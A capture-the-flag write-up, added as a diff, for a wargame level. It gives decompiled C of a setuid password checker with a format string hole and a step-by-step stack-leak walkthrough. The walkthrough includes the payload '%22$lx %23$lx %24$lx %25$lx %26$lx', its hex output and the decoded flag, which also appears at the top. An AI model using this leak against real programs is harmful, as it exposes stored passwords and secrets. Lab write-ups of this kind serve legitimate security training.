@@ -1,0 +1,80 @@
+flag: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+int main() {
+	char password[120];
+	char file_buffer[48];
+	char username[96];
+	FILE *password_file;
+
+	bzero(username, 96);
+	bzero(file_buffer, 40);
+	bzero(password, 96);
+
+	password_file = fopen("/home/users/level03/.pass", "r");
+	if (!password_file) {
+		fwrite("Error...", ..., stderr);
+		exit(1);
+	}
+
+	int bytes = fread(file_buffer, 41, password_file);
+	len = strcspn(file_buffer, "\n");
+	file_buffer[len] = '\0';
+	if (bytes != 41) {
+		fwrite("Error...", ..., stderr);
+		exit(1);
+	}
+	fclose(password_file);
+
+	puts("Username: ");
+	fgets(username, 100, stdin);
+	len = strcspn(username, "\n");
+	username[len] = '\0';
+
+	puts("Password: ");
+	fgets(password, 100, stdin);
+	len = strcspn(password, "\n");
+	password[len] = '\0';
+
+	if (!strncmp(file_buffer, password, 41)) {
+		printf("Greetings, %s!\n", username);
+		system("/bin/sh");
+		return 0;
+	}
+
+	printf(username); // string format exploit ?
+	puts(" does not have access");
+	exit(1);
+}
+
+This level is a format string exploitation. It asks for an username and a password,
+and printf the username. Before that, it reads the .pass file, which means gdb is
+unusable because gdb deactivate the setuid property. We know the content of the .pass
+file is in the stack. We can pass some flags to the username to exploit the properties
+of printf.
+Decompilating the script tells us that the password is 14 indexes, the buffer for the
+.pass file is 6 bytes, and the username is 12 indexes.
+We also know that the buffer containing our flag is between the password and the
+username.
+We can use printf to map the stack, by typing "ABCD %x %x %x %x"... in the username
+field, and EFGH in the password field. The "44434241" and "48474645" gives us the
+position of username and password in the stack: username is at the 28th arg, and
+password at the 8th.
+
+We know the password is 14 args long, so we add its start position to its size to get
+the start of the flag buffer: 8+14=22
+The flag buffer is 6 args long, with the last being the null-byte. So our flag is
+contained in the args 22 to 26.
+
+We can type this in the username field to get our flag in hexadecimal:
+%22$lx %23$lx %24$lx %25$lx %26$lx
+This will get us our flag in hexadecimal and little endian:
+
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
+
+We can now reverse each byte to make it big endian:
+
+4868373452506E75 51397361354A4145 58674E5743717A37 7358476E68354A35 4D394B6650673348
+
+And we just have to convert each byte to its ascii value (using an online converter):
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
